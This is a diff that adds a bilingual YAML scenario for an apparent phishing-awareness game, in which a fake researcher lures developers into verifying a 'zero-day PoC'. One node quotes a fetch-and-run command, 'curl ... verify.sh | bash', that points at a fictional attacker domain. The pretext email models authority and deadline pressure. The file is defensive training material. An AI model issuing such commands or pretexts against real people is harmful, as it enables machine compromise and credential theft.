@@ -1,0 +1,222 @@
+type: challenge
+title: "The Security Researcher"
+description: "A researcher claims to have found a zero-day in your product. They want you to verify their PoC exploit."
+difficulty: hard
+cialdini_categories:
+  - authority
+  - scarcity
+  - reciprocity
+estimated_time: 15
+metadata:
+  author: "Pretexta"
+  tags: [watering-hole, technical-phishing, zero-day, developer-targeting]
+
+nodes:
+  - id: start
+    type: message
+    channel: email_inbox
+    content_en:
+      subject: "Critical RCE Vulnerability in Your Auth API — Responsible Disclosure"
+      from: "Dr. Alex Kovacs <a.kovacs@sec-research-lab.io>"
+      body: "Dear Security Team,\n\nI am a senior researcher at the European Cybersecurity Research Institute. During our automated scanning program, we identified a critical Remote Code Execution vulnerability (pre-CVE assignment, estimated CVSS 9.8) in your authentication API endpoint /api/v2/oauth/callback.\n\nI have prepared a detailed write-up and proof-of-concept at our disclosure portal: https://sec-research-lab.io/disclosures/2025/your-company\n\nPer our responsible disclosure policy, we will publish publicly in 48 hours unless we receive acknowledgment.\n\nI also noticed your bug bounty program — happy to coordinate through that channel.\n\nBest regards,\nDr. Alex Kovacs\nECSRI | PGP Key: 0x7A3F2B91"
+    content_id:
+      subject: "Kerentanan RCE Kritis di API Auth Anda — Pengungkapan Bertanggung Jawab"
+      from: "Dr. Alex Kovacs <a.kovacs@sec-research-lab.io>"
+      body: "Tim Keamanan,\n\nSaya peneliti senior di Institut Riset Keamanan Siber Eropa. Selama program pemindaian otomatis, kami mengidentifikasi kerentanan Remote Code Execution kritis (pra-penugasan CVE, estimasi CVSS 9.8) di endpoint API autentikasi Anda /api/v2/oauth/callback.\n\nSaya telah menyiapkan laporan detail dan proof-of-concept di portal pengungkapan kami.\n\nSesuai kebijakan pengungkapan bertanggung jawab kami, kami akan mempublikasikan dalam 48 jam kecuali kami menerima konfirmasi."
+    next: choice_1
+
+  - id: choice_1
+    type: question
+    content_en:
+      text: "The email looks professional with PGP keys and proper responsible disclosure language. The 48-hour deadline creates urgency. What do you do?"
+    content_id:
+      text: "Email terlihat profesional dengan kunci PGP dan bahasa pengungkapan yang tepat. Tenggat 48 jam menciptakan urgensi. Apa yang kamu lakukan?"
+    options:
+      - text: "Click the disclosure link to read the vulnerability details"
+        text_id: "Klik link pengungkapan untuk membaca detail kerentanan"
+        next: clicked_link
+        score_impact: -20
+      - text: "Forward to the security team and reply asking for the CVE number"
+        text_id: "Teruskan ke tim keamanan dan balas meminta nomor CVE"
+        next: ask_cve
+        score_impact: 15
+      - text: "Verify the researcher's identity independently — check ECSRI's website and publications"
+        text_id: "Verifikasi identitas peneliti secara independen — cek website dan publikasi ECSRI"
+        next: verify_researcher
+        score_impact: 25
+      - text: "Ignore the email — it's probably spam"
+        text_id: "Abaikan email — mungkin spam"
+        next: ignore_outcome
+        score_impact: -5
+
+  - id: clicked_link
+    type: message
+    channel: browser
+    content_en:
+      text: "The page looks like a legitimate security disclosure portal. It shows a detailed vulnerability report with code snippets. At the bottom: 'To verify the PoC, run the following command in your terminal:' followed by a curl command that pipes to bash."
+    content_id:
+      text: "Halaman terlihat seperti portal pengungkapan keamanan yang sah. Menampilkan laporan kerentanan detail dengan potongan kode. Di bagian bawah: 'Untuk memverifikasi PoC, jalankan perintah berikut di terminal Anda:' diikuti perintah curl yang di-pipe ke bash."
+    next: choice_run_poc
+
+  - id: choice_run_poc
+    type: question
+    content_en:
+      text: "The 'PoC' wants you to run: curl https://sec-research-lab.io/poc/verify.sh | bash. What do you do?"
+    content_id:
+      text: "'PoC' meminta kamu menjalankan: curl https://sec-research-lab.io/poc/verify.sh | bash. Apa yang kamu lakukan?"
+    options:
+      - text: "Run the command to see the vulnerability in action"
+        text_id: "Jalankan perintah untuk melihat kerentanan beraksi"
+        next: bad_outcome_rce
+        score_impact: -100
+      - text: "Download the script first and read it before running"
+        text_id: "Download script dulu dan baca sebelum menjalankan"
+        next: read_script
+        score_impact: 10
+      - text: "Stop — never pipe curl to bash. Report this to the security team as a potential attack"
+        text_id: "Berhenti — jangan pernah pipe curl ke bash. Laporkan ini ke tim keamanan sebagai potensi serangan"
+        next: good_outcome_caught
+        score_impact: 40
+
+  - id: read_script
+    type: message
+    channel: narrator
+    content_en:
+      text: "You download the script. It's heavily obfuscated — base64 encoded payloads, environment variable checks, and nested eval statements. It's clearly not a simple PoC."
+    content_id:
+      text: "Kamu mendownload script. Sangat terobfuskasi — payload encoded base64, pengecekan environment variable, dan statement eval bersarang. Jelas bukan PoC sederhana."
+    next: choice_obfuscated
+
+  - id: choice_obfuscated
+    type: question
+    content_en:
+      text: "The script is heavily obfuscated. This is highly suspicious for a legitimate PoC. What now?"
+    content_id:
+      text: "Script sangat terobfuskasi. Ini sangat mencurigakan untuk PoC yang sah. Sekarang apa?"
+    options:
+      - text: "Run it anyway in a sandbox VM"
+        text_id: "Jalankan saja di VM sandbox"
+        next: bad_outcome_sandbox
+        score_impact: -30
+      - text: "Report the entire interaction as a targeted attack"
+        text_id: "Laporkan seluruh interaksi sebagai serangan terarah"
+        next: good_outcome_reported
+        score_impact: 30
+
+  - id: ask_cve
+    type: message
+    channel: email_inbox
+    content_en:
+      from: "Dr. Alex Kovacs <a.kovacs@sec-research-lab.io>"
+      subject: "Re: Critical RCE — CVE Assignment"
+      body: "The CVE is in pre-assignment phase with MITRE. We expect CVE-2025-XXXX within 72 hours. I understand your caution, but the vulnerability is actively exploitable. Please review the PoC at your earliest — I'd hate for this to be exploited in the wild before you can patch it.\n\nI can also schedule a video call to walk through the exploit chain if that helps build trust."
+    content_id:
+      from: "Dr. Alex Kovacs <a.kovacs@sec-research-lab.io>"
+      subject: "Re: RCE Kritis — Penugasan CVE"
+      body: "CVE dalam fase pra-penugasan dengan MITRE. Kami mengharapkan CVE-2025-XXXX dalam 72 jam. Saya mengerti kehatian-hatian Anda, tapi kerentanan ini aktif dan bisa dieksploitasi. Silakan review PoC secepatnya."
+    next: choice_followup
+
+  - id: choice_followup
+    type: question
+    content_en:
+      text: "The researcher doesn't have a CVE number yet and is offering a video call. They seem helpful but are still pushing you toward their PoC. What do you do?"
+    content_id:
+      text: "Peneliti belum punya nomor CVE dan menawarkan video call. Mereka tampak membantu tapi tetap mendorongmu ke PoC mereka. Apa yang kamu lakukan?"
+    options:
+      - text: "Accept the video call — that will prove they're legitimate"
+        text_id: "Terima video call — itu akan membuktikan mereka sah"
+        next: bad_outcome_video
+        score_impact: -15
+      - text: "Ask them to submit through the bug bounty platform instead"
+        text_id: "Minta mereka submit melalui platform bug bounty"
+        next: good_outcome_bounty
+        score_impact: 35
+
+  - id: verify_researcher
+    type: message
+    channel: narrator
+    content_en:
+      text: "You search for 'European Cybersecurity Research Institute' and 'Dr. Alex Kovacs'. The institute's website was registered 3 weeks ago. No publications found. The domain sec-research-lab.io was registered 5 days ago. LinkedIn shows no matching researcher profile."
+    content_id:
+      text: "Kamu mencari 'Institut Riset Keamanan Siber Eropa' dan 'Dr. Alex Kovacs'. Website institut didaftarkan 3 minggu lalu. Tidak ada publikasi ditemukan. Domain sec-research-lab.io didaftarkan 5 hari lalu. LinkedIn tidak menunjukkan profil peneliti yang cocok."
+    next: good_outcome_osint
+
+  - id: bad_outcome_rce
+    type: end
+    result: failure
+    content_en:
+      title: "Compromised — Remote Code Execution"
+      explanation: "You ran a malicious script that installed a reverse shell on your machine. The 'researcher' now has full access to your development environment, credentials, and internal network. NEVER pipe curl to bash, especially from untrusted sources. Legitimate PoCs provide readable code, not obfuscated payloads."
+    content_id:
+      title: "Terkompromi — Eksekusi Kode Jarak Jauh"
+      explanation: "Kamu menjalankan script berbahaya yang menginstal reverse shell di mesinmu. 'Peneliti' sekarang memiliki akses penuh ke environment pengembangan, kredensial, dan jaringan internal. JANGAN PERNAH pipe curl ke bash dari sumber yang tidak dipercaya."
+
+  - id: bad_outcome_sandbox
+    type: end
+    result: failure
+    content_en:
+      title: "Partial Compromise — Sandbox Escape"
+      explanation: "The script detected the VM environment and attempted sandbox escape techniques. While sandboxing was a better choice than running on your main machine, the right answer was to not run untrusted code at all. Report the suspicious interaction to your security team instead."
+    content_id:
+      title: "Kompromi Parsial — Sandbox Escape"
+      explanation: "Script mendeteksi environment VM dan mencoba teknik sandbox escape. Meskipun sandbox lebih baik dari menjalankan di mesin utama, jawaban yang benar adalah tidak menjalankan kode tidak tepercaya sama sekali."
+
+  - id: bad_outcome_video
+    type: end
+    result: failure
+    content_en:
+      title: "Partial Compromise — Continued Engagement"
+      explanation: "By continuing to engage with the attacker, you gave them more reconnaissance opportunities. They could observe your office environment, gauge your technical level, and tailor follow-up attacks. The researcher's identity couldn't be verified — engagement should have stopped there."
+    content_id:
+      title: "Kompromi Parsial — Keterlibatan Berlanjut"
+      explanation: "Dengan terus berinteraksi, kamu memberikan lebih banyak kesempatan pengintaian. Mereka bisa mengamati lingkungan kantor, menilai level teknis, dan menyesuaikan serangan lanjutan."
+
+  - id: ignore_outcome
+    type: end
+    result: failure
+    content_en:
+      title: "Missed Opportunity"
+      explanation: "Ignoring the email isn't the best response. While the email was indeed malicious, it should have been reported to your security team so they could block the domain, analyze the attack, and warn other employees. Every attack attempt is intelligence."
+    content_id:
+      title: "Kesempatan Terlewat"
+      explanation: "Mengabaikan email bukan respons terbaik. Meskipun email memang berbahaya, seharusnya dilaporkan ke tim keamanan agar mereka bisa memblokir domain, menganalisis serangan, dan memperingatkan karyawan lain."
+
+  - id: good_outcome_caught
+    type: end
+    result: success
+    content_en:
+      title: "Defended — Recognized Malicious PoC"
+      explanation: "Excellent detection. 'curl | bash' is a massive red flag — no legitimate security researcher would ask you to run piped commands. You correctly identified this as an attack vector (supply chain / watering hole) and reported it. The security team traced the infrastructure and found it was part of a broader campaign targeting developers."
+    content_id:
+      title: "Berhasil Bertahan — Mengenali PoC Berbahaya"
+      explanation: "Deteksi luar biasa. 'curl | bash' adalah tanda bahaya besar — tidak ada peneliti keamanan yang sah akan meminta kamu menjalankan perintah piped. Kamu dengan benar mengidentifikasi ini sebagai vektor serangan."
+
+  - id: good_outcome_reported
+    type: end
+    result: success
+    content_en:
+      title: "Defended — Attack Chain Broken"
+      explanation: "By recognizing the obfuscated script as suspicious and reporting the entire interaction, you helped the security team identify a targeted attack campaign. The fake research institute was set up specifically to target developers at your company."
+    content_id:
+      title: "Berhasil Bertahan — Rantai Serangan Terputus"
+      explanation: "Dengan mengenali script terobfuskasi sebagai mencurigakan dan melaporkan seluruh interaksi, kamu membantu tim keamanan mengidentifikasi kampanye serangan terarah."
+
+  - id: good_outcome_osint
+    type: end
+    result: success
+    content_en:
+      title: "Defended — OSINT Verification"
+      explanation: "Outstanding investigative instinct. You verified the researcher's identity through open-source intelligence and discovered the entire operation was fabricated: recently registered domains, no academic publications, no LinkedIn presence. You reported the phishing attempt and the domain was blocked across the organization."
+    content_id:
+      title: "Berhasil Bertahan — Verifikasi OSINT"
+      explanation: "Insting investigatif luar biasa. Kamu memverifikasi identitas peneliti melalui open-source intelligence dan menemukan seluruh operasi dibuat-buat: domain baru didaftarkan, tidak ada publikasi akademis, tidak ada profil LinkedIn."
+
+  - id: good_outcome_bounty
+    type: end
+    result: success
+    content_en:
+      title: "Defended — Proper Channel Redirect"
+      explanation: "Smart move. By redirecting to the official bug bounty platform, you applied a structured, verified process. Legitimate researchers are happy to use official channels. The attacker stopped responding — proving their intentions weren't legitimate. The bug bounty platform provides identity verification, safe PoC submission, and legal protections."
+    content_id:
+      title: "Berhasil Bertahan — Pengalihan ke Channel Resmi"
+      explanation: "Langkah cerdas. Dengan mengarahkan ke platform bug bounty resmi, kamu menerapkan proses terstruktur dan terverifikasi. Peneliti yang sah senang menggunakan channel resmi. Penyerang berhenti merespons — membuktikan niat mereka tidak sah."
